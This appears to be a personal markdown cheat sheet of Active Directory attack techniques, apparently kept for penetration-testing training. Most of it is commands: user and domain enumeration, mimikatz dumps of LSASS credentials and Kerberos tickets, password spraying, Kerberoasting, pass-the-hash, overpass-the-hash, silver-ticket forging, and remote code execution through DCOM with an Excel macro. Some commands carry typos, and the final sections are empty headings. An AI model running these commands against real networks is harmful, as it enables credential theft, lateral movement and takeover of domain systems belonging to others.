# Enumeration
- Enumerate all local accounts
```bat
net user
```
- Enumerate users in the entire domain
``` bat
net user /domain
```
- Enumerate specific domain user
```bat
net user xonork /domain
```
- Enumerate all groups in a domain
```bat
net group /domain
```
- Obtain domain
```powershell
PS : [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
``` 
- Enumerate logged-in users ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1))
```
PS C:\Tools\active_directory> Import-Module .\PowerView.ps1

PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName [COMPUTER_NAME]
```
- Enumerate active sessions on the DC
```bat
PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
```

# Obtain passwords/tickets
- Hashes in LSASS memory space
  ```bat
  C:\Tools\active_directory> mimikatz.exe
  
  mimikatz # privilege::debug
  
  mimikatz # sekurlsa::logonpasswords
  ```
  If *Wdigest* is enabled, it will reveal clear text passwords
  
- Obtain Tickets
  ```bat
  mimikatz # sekurlsa::tickets
  ```
- Export tickets
  ```bat
  mimikatz # kerberos::list /export
  ```
- Slow Password Guessing
  ```bat
  # Obtain the Lockout Threshold
  net accounts
  ```
  (Spray-Passwords.ps1)[https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1]
  ```bat
  .\Spray-Passwords.ps1 -Pass Test123 -Admin
  ```
  
# Kerberoasting
It is a technique used to decrypt a Kerberos Ticket
```bash
sudo apt update && sudo apt install kerberoast

python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt exported-kerberos-list-mimikatz.kirbi
``` 
- Tools like Hashcat or John The Reapper can be also used
- **Invoke-Kerberoast.ps1** can automatically enumerate all service prinvipal names in the domain, request service tickets for them, and export them in a format ready for cracking with JTR and Hashcat.

# Lateral Movement
## Pass The Hash
- It uses an NTLM Hash
- This will not work for Kerberos authentication, only for server or service using NTLM authentication.
- Useful tools:
  - PSecec
  - (Passing-the-hash toolkit)[https://github.com/byt3bl33d3r/pth-toolkit]
  - (Impacket)[https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py]

- Using *pth-winexe* from Pass-The-Hash-Toolkit
  ```bash
  pth-winexe -U xonork%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.11 cmd
  ```
## Overpass the Hash
- We can "over" abuse a NTLM user hash to gain a full TGT or sevice ticket
  1. Log in to the Windows machine as xonork and run a process as admin1
  2. Right-click the Notepad icon and shift-right click the Notepad icon on the popup
  3. Select _Run as different user_ and enter _admin1_. This way admin1s credential will be catched on this machine.
  4. Run with mimikatz **sekurlsa::longpasswords**
  5. Transform the NTLM hash into a Kerberos ticket with **sekurlsa::pth**
    ```bat
    mimikatz # sekurlsa::pth /user:admin1 /domain:test.com /ntlm:e2b475c11da2a1748290d87aa966c327 /run:PowerShell.exe
    ```
  6. Make an interactive login in orden to cath a Kerberos ticket
    ```bat
    PS C:\Windows\system32> net use \\dc01
    ```
  7. TGT to code execution using **(PSExec.exe)[https://learn.microsoft.com/en-us/sysinternals/downloads/psexec]**
    ```bat
    PS C:\> .\PsExec.exe \\dc01 cmd.exe
    ```
## Pass the Ticket
- We can only use TGT on the machine it was created for, but the TGS potentially offers more flexibility.
- TGS may be exported and re-injected elsewhere on the network and then used to auhthenticate to a specific service.
- This attack does not provide us with any additional access, but it offers fleixbility.
- The custom- created ticket is known as a *silver ticket*. **Mimikatz** can craft a silver ticket and inject it into memory through the **kerberos::golden**.

1. Obtain the SID of our current user
  ```bat
  whoami /user
  ```
2. Generate the Silver Ticket
  ```bat
  # Purge any existing Kerberos tickets
  mimikatz # kerberos::purge
  
  # Generate the silver ticket /rc4 is the password hash of the servicve account
  rkerberos::golden /user:offsec /domain:test.com /sid:S-1-6-21-1602875587-2787523311-2599479668 /target:TestWebServer.test.com /service:HTTP    /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```
## Distributed Component Object Model
- The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other
- Interaction with DCOM is performed over RPC on port 135.
- Requieres presence of Microsoft Office

- Discover available methods
  ```ps
  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","192.168.1.110"))
  $com | Get-Member
  ```
  If it containd the **Run** method it will allow us to execute a VBA macro remotely.
- Excel with macro
  1. We create an excel with the next VBA macro
    ```vba
    Sub mymacro()
      Shell ("notepad.exe")
    End Sub
    ```
  2. Execute macro
  ```ps
  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
  $LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
  $RemotePath = "\\192.168.1.110\c$\myexcel.xls"
  [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
  $Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
  $temp = [system.io.directory]::createDirectory($Path)
  $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
  $com.Run("mymacro")
  ```  
## Windows Management Instrumentation
## PowerShell Remoting
